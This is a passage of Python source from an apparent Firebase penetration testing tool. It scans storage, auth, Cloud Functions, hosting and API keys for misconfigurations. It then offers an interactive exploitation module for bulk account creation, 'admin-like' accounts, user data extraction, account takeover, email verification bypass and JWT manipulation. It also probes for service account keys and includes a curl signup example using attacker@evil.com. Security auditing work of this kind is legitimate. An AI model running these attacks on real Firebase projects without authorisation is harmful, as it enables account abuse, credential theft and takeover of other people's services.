                            description=f'Storage path "{path}" is accessible',
                            evidence=f'Path returned HTTP 200: {path}',
                            impact=f'Files in "{path}" directory may be exposed'
                        ))
        
        return vulnerabilities

    def _analyze_storage_files(self, files: list, base_url: str, vulnerabilities: list):
        """Analyze storage files for sensitive content"""
        for file_item in files[:50]:  # Limit analysis
            file_name = file_item.get('name', '')
            file_size = file_item.get('size', 0)
            
            # Check for sensitive file patterns
            sensitive_patterns = [
                (r'.*\.(key|pem|p12|pfx)$', 'CRITICAL', 'Cryptographic key file'),
                (r'.*\.(json|xml|yaml|yml)$', 'HIGH', 'Configuration file'),
                (r'.*\.(sql|db|sqlite)$', 'HIGH', 'Database file'),
                (r'.*\.(log|txt)$', 'MEDIUM', 'Log or text file'),
                (r'.*(config|secret|private|admin|backup|dump).*', 'HIGH', 'Sensitive naming pattern'),
                (r'.*\.(zip|tar|rar|7z)$', 'MEDIUM', 'Archive file'),
            ]
            
            for pattern, severity, description in sensitive_patterns:
                if re.match(pattern, file_name, re.IGNORECASE):
                    file_url = f"{base_url}/{file_name}" if not base_url.endswith('/') else f"{base_url}{file_name}"
                    
                    vulnerabilities.append(self._format_vulnerability(
                        type='Sensitive File Exposure',
                        severity=severity,
                        url=file_url,
                        description=f'{description}: {file_name}',
                        evidence=f'File: {file_name}, Size: {file_size} bytes',
                        impact='Potential sensitive data or credentials exposure'
                    ))
                    
                    print(f"{Colors.FAIL}[!] {severity}: Sensitive file '{file_name}'{Colors.ENDC}")
                    break

    def _test_authentication(self) -> List[Dict]:
        """Test Firebase Authentication for weaknesses"""
        vulnerabilities = []
        
        if not self.project_id:
            print(f"{Colors.WARNING}[!] Project ID needed for auth testing{Colors.ENDC}")
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Firebase Authentication...{Colors.ENDC}")
        
        # Test REST API endpoints with actual user creation attempts
        if self.api_key:
            signup_endpoints = [
                self.IDENTITY_TOOLKIT_SIGNUP_ENDPOINT_TEMPLATE.format(api_key=self.api_key),
                self.IDENTITY_TOOLKIT_SIGNUP_NEW_USER_ENDPOINT_TEMPLATE.format(api_key=self.api_key)
            ]
            test_email = f"pentester{int(time.time())}@example.com"
            test_password = "TestPassword123!"

            for endpoint_url in signup_endpoints:
                print(f"{Colors.CYAN}[*] Testing signup at: {endpoint_url.split('/')[-1].split('?')[0]}{Colors.ENDC}")
                payload_data = {"email": test_email, "password": test_password, "returnSecureToken": True}
                
                # Already uses _make_request and _format_vulnerability
                response = self._make_request('POST', endpoint_url, json=payload_data, timeout=10)
                if not response:
                    continue

                if response.status_code == 200:
                    try:
                        resp_data = response.json()
                        user_id = resp_data.get('localId', 'unknown')
                        id_token = resp_data.get('idToken', '')
                        
                        vulnerabilities.append(self._format_vulnerability(
                            type='Unrestricted User Registration',
                            severity='HIGH',
                            url=endpoint_url,
                            description='Successfully created user account without restrictions',
                            evidence=f'Created user ID: {user_id}, got auth token',
                            impact='Attackers can create unlimited accounts, potential for abuse, spam, or resource exhaustion',
                            exploitation=f'curl -X POST "{endpoint_url}" -H "Content-Type: application/json" -d \'{{"email":"attacker@evil.com","password":"password123","returnSecureToken":true}}\''
                        ))
                        print(f"{Colors.FAIL}[!] HIGH: Successfully created test user {test_email}{Colors.ENDC}")

                        if id_token:
                            account_lookup_endpoints = [
                                self.IDENTITY_TOOLKIT_LOOKUP_ENDPOINT_TEMPLATE.format(api_key=self.api_key),
                                self.IDENTITY_TOOLKIT_GET_ACCOUNT_INFO_ENDPOINT_TEMPLATE.format(api_key=self.api_key)
                            ]
                            for profile_ep in account_lookup_endpoints:
                                profile_payload = {"idToken": id_token}
                                profile_resp = self._make_request('POST', profile_ep, json=profile_payload, timeout=5)
                                if profile_resp and profile_resp.status_code == 200:
                                    profile_info = profile_resp.json()
                                    vulnerabilities.append(self._format_vulnerability(
                                        type='User Profile Information Disclosure',
                                        severity='MEDIUM',
                                        url=profile_ep,
                                        description='Created user profile is accessible',
                                        evidence=f'Retrieved profile data: {str(profile_info)[:200]}...',
                                        impact='User profile information can be accessed after account creation'
                                    ))
                                    print(f"{Colors.WARNING}[!] Can access user profile after creation{Colors.ENDC}")
                                    break 
                        
                        account_delete_endpoints = [
                            self.IDENTITY_TOOLKIT_DELETE_ENDPOINT_TEMPLATE.format(api_key=self.api_key),
                            self.IDENTITY_TOOLKIT_DELETE_ACCOUNT_ENDPOINT_TEMPLATE.format(api_key=self.api_key)
                        ]
                        for del_ep in account_delete_endpoints:
                            del_payload = {"idToken": id_token} if id_token else {"localId": user_id}
                            del_resp = self._make_request('POST', del_ep, json=del_payload, timeout=5)
                            if del_resp and del_resp.status_code == 200:
                                print(f"{Colors.GREEN}[✓] Cleaned up test user {test_email}{Colors.ENDC}")
                                break
                        else: 
                             print(f"{Colors.WARNING}[!] Could not cleanup test user {test_email}{Colors.ENDC}")

                    except json.JSONDecodeError:
                        vulnerabilities.append(self._format_vulnerability(
                            type='Authentication Endpoint Accessible',
                            severity='MEDIUM',
                            url=endpoint_url,
                            description='Signup endpoint returns HTTP 200 but invalid JSON response',
                            evidence=f'Response: {response.text[:200]}...',
                            impact='Authentication system may be misconfigured'
                        ))
                        print(f"{Colors.WARNING}[!] Signup endpoint {endpoint_url} returned 200 but with invalid JSON.{Colors.ENDC}")

                elif response.status_code == 400:
                    try:
                        error_data = response.json()
                        error_message = error_data.get('error', {}).get('message', '')
                        if 'EMAIL_EXISTS' in error_message:
                            print(f"{Colors.GREEN}[✓] Signup at {endpoint_url.split('/')[-1].split('?')[0]} works but email validation prevents duplicate.{Colors.ENDC}")
                        elif 'OPERATION_NOT_ALLOWED' in error_message:
                            print(f"{Colors.GREEN}[✓] User registration at {endpoint_url.split('/')[-1].split('?')[0]} is properly disabled.{Colors.ENDC}")
                        elif 'WEAK_PASSWORD' in error_message:
                            vulnerabilities.append(self._format_vulnerability(
                                type='Registration Enabled with Weak Controls',
                                severity='MEDIUM',
                                url=endpoint_url,
                                description='User registration is enabled but rejected due to weak password policy',
                                evidence=f'Error: {error_message}',
                                impact='Registration is possible with stronger passwords'
                            ))
                            print(f"{Colors.WARNING}[!] MEDIUM: Registration at {endpoint_url.split('/')[-1].split('?')[0]} enabled, but password policy rejected attempt.{Colors.ENDC}")
                        elif 'INVALID_EMAIL' in error_message:
                             print(f"{Colors.GREEN}[✓] Email validation working properly at {endpoint_url.split('/')[-1].split('?')[0]}.{Colors.ENDC}")
                        else:
                            print(f"{Colors.WARNING}[!] Unexpected auth error from {endpoint_url.split('/')[-1].split('?')[0]}: {error_message}{Colors.ENDC}")
                    except json.JSONDecodeError:
                        print(f"{Colors.WARNING}[!] Auth endpoint {endpoint_url.split('/')[-1].split('?')[0]} returned 400 with non-JSON response.{Colors.ENDC}")
                
                elif response.status_code == 403:
                    print(f"{Colors.GREEN}[✓] User registration at {endpoint_url.split('/')[-1].split('?')[0]} properly restricted (403).{Colors.ENDC}")
                elif response.status_code == 404:
                    print(f"{Colors.CYAN}[*] Auth endpoint not found: {endpoint_url.split('/')[-1].split('?')[0]}{Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] Unexpected response {response.status_code} from auth endpoint {endpoint_url.split('/')[-1].split('?')[0]}{Colors.ENDC}")
        
        # Test for exposed authentication configuration
        firebase_app_url_base = self.FIREBASE_APP_URL_BASE_TEMPLATE.format(project_id=self.project_id)
        web_app_url_base = self.WEB_APP_URL_BASE_TEMPLATE.format(project_id=self.project_id)

        config_paths_to_check = [
            self.FIREBASE_INIT_JSON_PATH,
            self.FIREBASE_CONFIG_JS_PATH,
            self.FIREBASE_CONFIG_JSON_PATH
        ]
        
        possible_config_urls = [f"{firebase_app_url_base}{path}" for path in config_paths_to_check] + \
                               [f"{web_app_url_base}{path}" for path in config_paths_to_check]
        
        for config_url in possible_config_urls:
            # Already uses _make_request and _format_vulnerability
            response = self._make_request('GET', config_url, timeout=5)
            if not response:
                continue

            if response.status_code == 200:
                content = response.text
                sensitive_indicators = ['apiKey', 'authDomain', 'databaseURL', 'projectId', 'storageBucket', 'messagingSenderId', 'appId']
                
                if any(indicator in content for indicator in sensitive_indicators):
                    try:
                        config_data = response.json()
                        vulnerabilities.append(self._format_vulnerability(
                            type='Firebase Configuration Exposure',
                            severity='LOW',
                            url=config_url,
                            description='Firebase configuration publicly accessible',
                            evidence=f'Config keys: {list(config_data.keys()) if isinstance(config_data, dict) else "Invalid JSON"}',
                            impact='API keys and project configuration exposed (normal for client-side apps but should be noted)'
                        ))
                        print(f"{Colors.YELLOW}[!] LOW: Firebase config exposed (normal for web apps) at {config_url}{Colors.ENDC}")
                    except json.JSONDecodeError:
                        if len(content) > 50:
                            vulnerabilities.append(self._format_vulnerability(
                                type='Configuration File Exposure',
                                severity='MEDIUM',
                                url=config_url,
                                description='Configuration file accessible but contains non-JSON data',
                                evidence=(content[:197] + '...') if len(content) > 200 else content,
                                impact='Potential configuration or sensitive data exposure'
                            ))
                            print(f"{Colors.WARNING}[!] MEDIUM: Non-JSON configuration file exposed at {config_url}{Colors.ENDC}")
            
        return vulnerabilities

    def _test_cloud_functions(self) -> List[Dict]:
        """Enhanced Cloud Functions testing with better enumeration"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
        
        print(f"\n{Colors.CYAN}[*] Enhanced Cloud Functions Testing...{Colors.ENDC}")
        
        # Extended regions list
        regions = [
            'us-central1', 'us-east1', 'us-east4', 'us-west1', 'us-west2', 'us-west3', 'us-west4',
            'europe-west1', 'europe-west2', 'europe-west3', 'europe-west6', 'europe-central2',
            'asia-east1', 'asia-east2', 'asia-northeast1', 'asia-northeast2', 'asia-northeast3',
            'asia-south1', 'asia-southeast1', 'asia-southeast2', 'australia-southeast1'
        ]
        
        # Massively expanded function names
        function_names = [
            # API endpoints
            'api', 'app', 'main', 'index', 'handler', 'webhook', 'callback',
            'graphql', 'rest', 'endpoint', 'gateway', 'proxy',
            
            # Authentication
            'auth', 'login', 'signin', 'signup', 'register', 'verify', 'validate',
            'authenticate', 'authorize', 'token', 'refresh', 'logout',
            
            # User management
            'user', 'users', 'profile', 'account', 'member', 'customer',
            'createUser', 'updateUser', 'deleteUser', 'getUser',
            
            # Admin functions
            'admin', 'dashboard', 'manage', 'control', 'system', 'config',
            'settings', 'maintenance', 'backup', 'restore',
            
            # Business logic
            'order', 'payment', 'checkout', 'purchase', 'transaction',
            'notification', 'email', 'sms', 'message', 'alert',
            
            # Data processing
            'process', 'sync', 'import', 'export', 'migrate', 'transform',
            'aggregate', 'analyze', 'report', 'calculate',
            
            # File handling
            'upload', 'download', 'file', 'image', 'document', 'media',
            'resize', 'compress', 'convert', 'generate',
            
            # Development/Testing
            'test', 'debug', 'dev', 'staging', 'prod', 'hello', 'ping',
            'health', 'status', 'info', 'version',
            
            # Common business functions
            'search', 'filter', 'sort', 'list', 'get', 'post', 'put', 'delete',
            'create', 'read', 'update', 'remove', 'fetch', 'send', 'receive'
        ]
        
        found_functions = []
        
        for region in regions:
            print(f"{Colors.CYAN}[*] Testing region: {region}{Colors.ENDC}")
            
            for func_name in function_names:
                func_url = f"https://{region}-{self.project_id}.cloudfunctions.net/{func_name}"
                
                response = self._make_request('GET', func_url, timeout=5)
                if not response:
                    continue
                    
                if response.status_code == 200:
                    found_functions.append((func_name, region, func_url))
                    
                    # Analyze response
                    content_length = len(response.text)
                    severity = 'HIGH' if 'admin' in func_name or content_length > 1000 else 'MEDIUM'
                    
                    vulnerabilities.append(self._format_vulnerability(
                        type='Exposed Cloud Function',
                        severity=severity,
                        url=func_url,
                        description=f'Function "{func_name}" accessible in {region}',
                        evidence=f'HTTP 200 response, {content_length} chars',
                        impact='Unauthorized function execution possible'
                    ))
                    
                    print(f"{Colors.WARNING}[!] Found: {func_name} in {region}{Colors.ENDC}")
                    
                    # Test with different HTTP methods
                    self._test_function_methods(func_url, func_name, vulnerabilities)
                    
                elif response.status_code == 403:
                    # Function exists but access denied - still valuable info
                    print(f"{Colors.GREEN}[i] Function exists (403): {func_name} in {region}{Colors.ENDC}")
        
        if found_functions:
            print(f"\n{Colors.YELLOW}[!] Found {len(found_functions)} accessible functions{Colors.ENDC}")
        
        return vulnerabilities

    def _test_function_methods(self, func_url: str, func_name: str, vulnerabilities: list):
        """Test Cloud Function with different HTTP methods"""
        methods = ['POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        
        for method in methods:
            try:
                response = self._make_request(method, func_url, timeout=3)
                if response and response.status_code not in [404, 405, 501]:
                    vulnerabilities.append(self._format_vulnerability(
                        type='Function Method Access',
                        severity='MEDIUM',
                        url=func_url,
                        description=f'Function "{func_name}" accepts {method} method',
                        evidence=f'{method} returned {response.status_code}',
                        impact=f'Function may accept {method} requests for data modification'
                    ))
            except:
                continue

    def _test_api_keys(self) -> List[Dict]:
        """Test API key restrictions and validity"""
        vulnerabilities = []
        
        if not self.api_key:
            print(f"{Colors.WARNING}[!] No API key to test{Colors.ENDC}")
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing API Key Security...{Colors.ENDC}")
        
        project_api_url = self.FIREBASE_PROJECT_API_URL_TEMPLATE.format(project_id=self.project_id)
        
        # Already uses _make_request and _format_vulnerability
        response = self._make_request('GET', f"{project_api_url}?key={self.api_key}", timeout=10)
        
        if response: 
            if response.status_code == 403:
                try:
                    error_data = response.json()
                except json.JSONDecodeError:
                    error_data = {} 
                error_message = error_data.get('error', {}).get('message', '')
                
                if 'API key not valid' in error_message:
                    print(f"{Colors.FAIL}[!] API key is invalid or expired{Colors.ENDC}")
                    return vulnerabilities 
                elif 'restricted' in error_message.lower():
                    print(f"{Colors.GREEN}[✓] API key has proper restrictions (according to Google's check).{Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] API key restriction unclear from response: {error_message}{Colors.ENDC}")
                    
            elif response.status_code == 200:
                vulnerabilities.append(self._format_vulnerability(
                    type='Overprivileged API Key',
                    severity='HIGH',
                    url=project_api_url,
                    description='API key has access to project management APIs.',
                    evidence='HTTP 200 response to project details endpoint, indicating broad permissions.',
                    impact='API key may have excessive permissions, potentially allowing unauthorized project management actions.'
                ))
                print(f"{Colors.FAIL}[!] HIGH: API key has project-level access at {project_api_url}{Colors.ENDC}")

        print(f"{Colors.CYAN}[*] Testing referrer restrictions...{Colors.ENDC}")
        
        if not self.project_id or not self.api_key:
            print(f"{Colors.WARNING}[!] Project ID or API Key not set, skipping referrer restriction tests.{Colors.ENDC}")
        else:
            config_test_url = f"https://{self.FIREBASE_APP_URL_BASE_TEMPLATE.format(project_id=self.project_id)}{self.FIREBASE_INIT_JSON_PATH}?key={self.api_key}"
            test_referrers = self.TEST_REFERRERS 
            
            baseline_response = self._make_request('GET', config_test_url, timeout=5)
            restriction_bypassed = False
            successful_referrers = []

            if baseline_response:
                for referrer in test_referrers:
                    headers = {'Referer': referrer, 'Origin': referrer}
                    response = self._make_request('GET', config_test_url, headers=headers, timeout=5)
                    
                    if response and response.status_code == 200:
                        if baseline_response.status_code == 200 and response.text == baseline_response.text:
                            restriction_bypassed = True
                            successful_referrers.append(referrer)
                            print(f"{Colors.WARNING}[!] API key works with referrer: {referrer}{Colors.ENDC}")
                        elif baseline_response.status_code != 200 : # Baseline failed but this succeeded
                            restriction_bypassed = True
                            successful_referrers.append(referrer)
                            print(f"{Colors.WARNING}[!] API key works with referrer {referrer} while baseline failed (Status: {baseline_response.status_code}).{Colors.ENDC}")


            if restriction_bypassed:
                vulnerabilities.append(self._format_vulnerability(
                    type='Weak API Key Restrictions',
                    severity='MEDIUM',
                    url=config_test_url,
                    description='API key may lack proper HTTP referrer restrictions.',
                    evidence=f'API key accessible from unauthorized referrers: {", ".join(successful_referrers)}',
                    impact='API key could be abused if stolen and used from malicious websites.'
                ))
            elif baseline_response is not None : # Check if baseline_response was actually set
                print(f"{Colors.GREEN}[✓] API key appears to have proper referrer restrictions or is otherwise protected.{Colors.ENDC}")
            # If baseline_response is None, _make_request already printed an error for the baseline attempt.

        firebase_app_url_base = self.FIREBASE_APP_URL_BASE_TEMPLATE.format(project_id=self.project_id)
        web_app_url_base = self.WEB_APP_URL_BASE_TEMPLATE.format(project_id=self.project_id)

        service_account_paths = [
            self.SERVICE_ACCOUNT_KEY_JSON_PATH,
            self.FIREBASE_ADMINSDK_JSON_PATH,
            self.DOT_ENV_PATH 
        ]
        possible_sa_urls = [f"{firebase_app_url_base}{path}" for path in service_account_paths] + \
                           [f"{web_app_url_base}{path}" for path in service_account_paths]
        
        for sa_url in possible_sa_urls:
            try:
                sa_response = self.session.get(sa_url, timeout=5)
                if sa_response.status_code == 200:
                    content = sa_response.text
                    if ('private_key' in content or 
                        'service_account' in content.lower() or
                        'firebase_admin' in content.lower()):
                        
                        vulnerabilities.append({
                            'type': 'Exposed Service Account Key',
                            'severity': 'CRITICAL',
                            'url': sa_url,
                            'description': 'Service account credentials publicly accessible',
                            'evidence': 'Found private_key or service account indicators',
                            'impact': 'Complete Firebase project compromise possible'
                        })
                        print(f"{Colors.FAIL}[!] CRITICAL: Service account key exposed at {sa_url}{Colors.ENDC}")
                        
            except requests.exceptions.RequestException:
                continue
                
        return vulnerabilities

    def _test_hosting(self) -> List[Dict]:
        """Test Firebase Hosting for issues"""
        vulnerabilities = []
        
        if not self.project_id:
            return vulnerabilities
            
        print(f"\n{Colors.CYAN}[*] Testing Firebase Hosting...{Colors.ENDC}")
        
        hosting_url_templates = [
            self.WEB_APP_URL_BASE_TEMPLATE, 
            self.FIREBASE_APP_URL_BASE_TEMPLATE 
        ]
        
        for url_template in hosting_url_templates:
            base_url = url_template.format(project_id=self.project_id)
            
            response = self._make_request('GET', base_url, timeout=10)
            if not response:
                continue
                
            if response.status_code == 200:
                content = response.text
                
                if '.map' in content:
                    map_urls = re.findall(r'sourceMappingURL=([^\s]+\.map)', content)
                    for map_url_path in map_urls: # Renamed map_url to map_url_path for clarity
                        full_map_url = urljoin(base_url, map_url_path)
                        map_resp = self._make_request('GET', full_map_url, timeout=5)
                        if map_resp and map_resp.status_code == 200:
                            vulnerabilities.append(self._format_vulnerability(
                                type='Source Map Exposure',
                                severity='MEDIUM',
                                url=full_map_url,
                                description='Source maps are publicly accessible, potentially exposing original source code.',
                                evidence=f'Source map found: {map_url_path} at {full_map_url}',
                                impact='Source code structure exposure, may reveal business logic or sensitive information if not properly managed.'
                            ))
                            print(f"{Colors.YELLOW}[!] MEDIUM: Source map exposed at {full_map_url}{Colors.ENDC}")
                
                for config_file_name in self.COMMON_CONFIG_FILE_NAMES:
                    config_url = urljoin(base_url, config_file_name) 
                    config_resp = self._make_request('GET', config_url, timeout=5)
                    if config_resp and config_resp.status_code == 200:
                        vulnerabilities.append(self._format_vulnerability(
                            type='Configuration File Exposure',
                            severity='HIGH',
                            url=config_url,
                            description=f'Configuration file exposed: {config_file_name}',
                            evidence=(config_resp.text[:197] + '...') if len(config_resp.text) > 200 else config_resp.text,
                            impact='Potential credentials or sensitive configuration exposure.'
                        ))
                        print(f"{Colors.WARNING}[!] HIGH: Exposed config file '{config_file_name}' at {config_url}{Colors.ENDC}")
            # No specific message for non-200 status for base_url itself, as it might be a valid scenario.
            # Errors in _make_request are handled within that method.
                            
        return vulnerabilities

    # Update the main exploitation menu to include JWT testing
    def _exploit_user_registration(self, endpoint: str, api_key: str) -> None:
        """Interactive exploitation of user registration vulnerability (Enhanced)"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║       ENHANCED EXPLOITATION MODULE       ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        print(f"\n{Colors.YELLOW}[*] Exploiting User Registration at: {endpoint}{Colors.ENDC}")
        
        while True:
            print(f"\n{Colors.CYAN}[*] Exploitation Options:{Colors.ENDC}")
            print("1. Create single user account")
            print("2. Create multiple user accounts (bulk)")
            print("3. Create admin-like account")
            print("4. Extract user information (Enhanced)")
            print("5. Test account modification/takeover")
            print("6. Test email verification bypass (Comprehensive)")
            print("7. Test JWT manipulation bypass (Comprehensive)")
            print("8. Back to main menu") # Adjusted numbering
            
            choice = input(f"\n{Colors.BOLD}{Colors.WHITE}[+] Select option (1-8): {Colors.ENDC}").strip() # Adjusted prompt and color
            
            if choice == "1":
                self._create_single_user(endpoint, api_key)
            elif choice == "2":
                self._create_bulk_users(endpoint, api_key)
            elif choice == "3":
                self._create_admin_user(endpoint, api_key)
            elif choice == "4":
                self._extract_user_info(api_key) 
            elif choice == "5":
                self._test_account_modification(api_key)
            elif choice == "6":
                self._test_email_verification_bypass(api_key) 
            elif choice == "7":
                self._test_jwt_manipulation_bypass(api_key) 
            elif choice == "8": 
                break
            else:
                print(f"{Colors.FAIL}[!] Invalid option. Please select a number between 1 and 8.{Colors.ENDC}") # Clarified error

    def _load_user_data_from_file(self, specific_file_path: Optional[str] = None) -> Optional[Dict]:
        """
        Loads user data from a JSON file.
        If specific_file_path is given, attempts to load that.
        Otherwise, lists available JSON files (firebase_*.json, etc.) and prompts for selection.
        Returns the loaded user data as a dictionary if successful and valid, else None.
        """
        user_data = None
        token_file_path = specific_file_path

        if not token_file_path:
            print(f"\n{Colors.CYAN}[*] Searching for saved user credential files...{Colors.ENDC}")
            found_files = []
            patterns_to_check = ["firebase_user_*.json", "firebase_enum_user_*.json", "firebase_db_user_*.json", "firebase_admin_*.json"]
            try:
                import glob as local_glob # Conditional import
                for pattern in patterns_to_check:
                    found_files.extend(local_glob.glob(pattern))
            except ImportError:
                print(f"{Colors.WARNING}[!] 'glob' module not available. Cannot automatically search for user files.{Colors.ENDC}")
            
            if not found_files:
                print(f"{Colors.YELLOW}[i] No saved user files found matching patterns: {', '.join(patterns_to_check)}.{Colors.ENDC}")
                token_file_path = input(f"{Colors.BOLD}{Colors.WHITE}[+] Enter path to user token file manually: {Colors.ENDC}").strip()
                if not token_file_path:
                    return None # User aborted
            else:
                print(f"{Colors.CYAN}[*] Available User Files:{Colors.ENDC}")
                for i, filepath_item in enumerate(found_files, 1): # Renamed to avoid conflict
                    try:
                        import os as local_os # Conditional import
                        file_basename = local_os.path.basename(filepath_item)
                    except ImportError:
                        file_basename = filepath_item
                    print(f"  {i}. {file_basename}")
                
                try:
                    selection = input(f"{Colors.BOLD}{Colors.WHITE}[+] Select user file to load (number) or enter path: {Colors.ENDC}").strip()
                    if selection.isdigit() and (0 < int(selection) <= len(found_files)):
                        token_file_path = found_files[int(selection) - 1]
                    else: # Assume it's a path
                        token_file_path = selection 
                except ValueError:
                    print(f"{Colors.FAIL}[!] Invalid selection.{Colors.ENDC}")
                    return None
        
        if not token_file_path: # If still no path (e.g. manual entry was empty)
            print(f"{Colors.WARNING}[!] No file path provided.{Colors.ENDC}")
            return None

        try:
            print(f"{Colors.CYAN}[*] Loading user data from: {token_file_path}{Colors.ENDC}")
            with open(token_file_path, 'r') as f:
                loaded_data = json.load(f)

            if isinstance(loaded_data, list):
                print(f"{Colors.FAIL}[!] This file contains a list of users. Please provide a JSON file for a single user.{Colors.ENDC}")
                return None
            if not isinstance(loaded_data, dict):
                print(f"{Colors.FAIL}[!] Invalid JSON format. Expected a single user object (dictionary).{Colors.ENDC}")
                return None
            
            # Basic validation for essential keys
            if not loaded_data.get('id_token') and not loaded_data.get('idToken'): # Check both common key names
                 print(f"{Colors.FAIL}[!] The file for user '{loaded_data.get('email', 'Unknown')}' does not contain a required 'id_token'.{Colors.ENDC}")
                 return None

            user_data = loaded_data
            print(f"{Colors.GREEN}[✓] Successfully loaded data from {token_file_path}{Colors.ENDC}")

        except FileNotFoundError:
            print(f"{Colors.FAIL}[!] File not found: {token_file_path}{Colors.ENDC}")
        except json.JSONDecodeError:
            print(f"{Colors.FAIL}[!] Invalid JSON in file: {token_file_path}{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.FAIL}[!] Failed to load or process token file {token_file_path}: {e}{Colors.ENDC}")
        
        return user_data

    def _test_account_modification(self, api_key: str) -> None:
        """Test various account modification and potential takeover scenarios."""
        print(f"\n{Colors.CYAN}[*] Account Modification and Takeover Testing{Colors.ENDC}")
        
        user_creds = None 

        while True: 
            print(f"\n{Colors.CYAN}[*] Select User for Testing:{Colors.ENDC}")
            print("1. Load user from saved file")
            print("2. Create a new user for testing")
            # Option 3 ("Select from previously found users") is effectively merged into option 1 by the helper.
            print("3. Back to previous menu")
            
            choice = input(f"{Colors.BOLD}{Colors.WHITE}[+] Select option (1-3): {Colors.ENDC}").strip()
            
            raw_user_data = None # To store data loaded from file or new creation

            if choice == "1":
                raw_user_data = self._load_user_data_from_file()
                if raw_user_data:
                    # Consolidate possible key names for tokens and IDs
                    id_token = raw_user_data.get('id_token', raw_user_data.get('idToken'))
                    user_id = raw_user_data.get('user_id', raw_user_data.get('localId'))
                    refresh_token = raw_user_data.get('refresh_token', raw_user_data.get('refreshToken'))
                    
                    if not id_token:
                        print(f"{Colors.FAIL}[!] Loaded data for user '{raw_user_data.get('email', 'Unknown')}' is missing 'id_token'. Cannot proceed.{Colors.ENDC}")
                        raw_user_data = None # Invalidate if token is missing
                    else:
                        user_creds = {
                            "email": raw_user_data.get('email', 'Unknown'),
                            "user_id": user_id,
                            "id_token": id_token,
                            "refresh_token": refresh_token,
                            "password": raw_user_data.get("password", raw_user_data.get("password_attempted", "Unknown"))
                        }
                        print(f"{Colors.GREEN}[✓] Prepared credentials for user: {user_creds['email']}{Colors.ENDC}")
                        break # Proceed to interactive modification
            elif choice == "2":
                default_email = f"mod.test.{int(time.time())}@{self.DEFAULT_EMAIL_DOMAINS[0] if self.DEFAULT_EMAIL_DOMAINS else 'example.com'}"
                email_input = input(f"{Colors.BOLD}{Colors.WHITE}[+] Enter email for new test user (default: {default_email}): {Colors.ENDC}").strip()
                email_input = email_input if email_input else default_email
                
                password_input = input(f"{Colors.BOLD}{Colors.WHITE}[+] Enter password for new test user (default: ModTestP@$$123!): {Colors.ENDC}").strip()
                password_input = password_input if password_input else "ModTestP@$$123!"
                
                print(f"{Colors.CYAN}[*] Creating new user: {email_input}{Colors.ENDC}")
                raw_user_data = self._create_test_user(email_input, password_input, api_key) 
                
                if raw_user_data and raw_user_data.get('idToken'):
                    user_creds = {
                        "email": email_input, # Use the input email
                        "password": password_input, # Use the input password
                        "user_id": raw_user_data.get('localId'),
                        "id_token": raw_user_data.get('idToken'),
                        "refresh_token": raw_user_data.get('refreshToken')
                    }
                    print(f"{Colors.GREEN}[✓] Created and prepared test user: {email_input}{Colors.ENDC}")
                    break # Proceed to interactive modification
                else:
                    print(f"{Colors.FAIL}[!] Failed to create or prepare test user.{Colors.ENDC}")
                    # Loop continues for another selection

            elif choice == "3": # Renumbered from 4
                return # Exit _test_account_modification method

            else:
                print(f"{Colors.FAIL}[!] Invalid choice.{Colors.ENDC}")
                # Loop continues, re-displaying menu

        # This part is reached if choice "1" or "2" was successful and broke the inner loop
        if user_creds:
            self._interactive_modification(user_creds, api_key)
        # If user_creds is still None here, it means something went wrong or user chose to exit.
        # The loop in _exploit_user_registration will handle showing its menu again.

    def _interactive_modification(self, user_creds: Dict, api_key: str) -> None:
        id_token = user_creds.get('id_token')
        email = user_creds.get('email')

        if not id_token:
            print(f"{Colors.FAIL}[!] No ID token found for user {email}. Cannot proceed.{Colors.ENDC}")
            return

        print(f"\n{Colors.CYAN}[*] Interactive Modification for User: {email}{Colors.ENDC}")
        
        while True:
            print(f"\n{Colors.CYAN}Modification Options for {email}:{Colors.ENDC}")
            print("1. Modify Display Name")
            print("2. Modify Photo URL")
            print("3. Modify Password (requires current password if known, or tests unauth change)")
            print("4. Attempt to verify email (if unverified)")
            print("5. Modify Custom Attributes (if supported)")
            print("6. Attempt to change Email Address")
            print("7. Test Account Deletion")
            print("8. Refresh ID Token (if refresh token available)")
            print("9. Back to previous menu")

            mod_choice = input(f"{Colors.BOLD}[+] Select modification (1-9): {Colors.ENDC}").strip()
            success = False

            if mod_choice == "1":
                success = self._modify_display_name(id_token, api_key)
            elif mod_choice == "2":
                success = self._modify_photo_url(id_token, api_key)
            elif mod_choice == "3":
                success = self._modify_password(id_token, api_key)
            elif mod_choice == "4":
                success = self._modify_email_verification(id_token, api_key)
            elif mod_choice == "5":
                success = self._modify_custom_attributes(id_token, api_key)
            elif mod_choice == "6":
                success = self._modify_email_address(id_token, api_key)
            elif mod_choice == "7":
                if self._delete_account_test(id_token, api_key):
                    print(f"{Colors.GREEN}[✓] Account deletion test successful.{Colors.ENDC}")
                    return
                else:
                    print(f"{Colors.FAIL}[!] Account deletion test failed.{Colors.ENDC}")
            elif mod_choice == "8":
                refresh_token = user_creds.get('refresh_token')
                if refresh_token:
                    new_id_token = self._refresh_id_token(refresh_token, api_key)
                    if new_id_token:
                        id_token = new_id_token
                        user_creds['id_token'] = new_id_token
                        print(f"{Colors.GREEN}[✓] ID Token refreshed successfully.{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Failed to refresh ID Token.{Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] No refresh token available for this user.{Colors.ENDC}")
            elif mod_choice == "9":
                break
            else:
                print(f"{Colors.FAIL}[!] Invalid modification choice.{Colors.ENDC}")

            if success and mod_choice not in ["7", "8", "9"]: # 7 is delete, 8 is refresh, 9 is back
                # For successful modifications that are not delete/refresh/back,
                # we can assume the token might have been updated if returnSecureToken was True.
                # However, the helper _update_user_profile currently doesn't return the new token.
                # This is a point for future improvement if necessary.
                print(f"{Colors.GREEN}[✓] Modification request sent. Consider re-fetching user profile or refreshing token to see changes.{Colors.ENDC}")

    def _update_user_profile(self, id_token: str, api_key: str, update_payload: Dict, success_message: str) -> bool:
        """
        Generic helper to update user profile attributes.
        Uses the 'accounts:update' endpoint.
        """
        if 'returnSecureToken' not in update_payload:
            update_payload['returnSecureToken'] = True # Usually desired

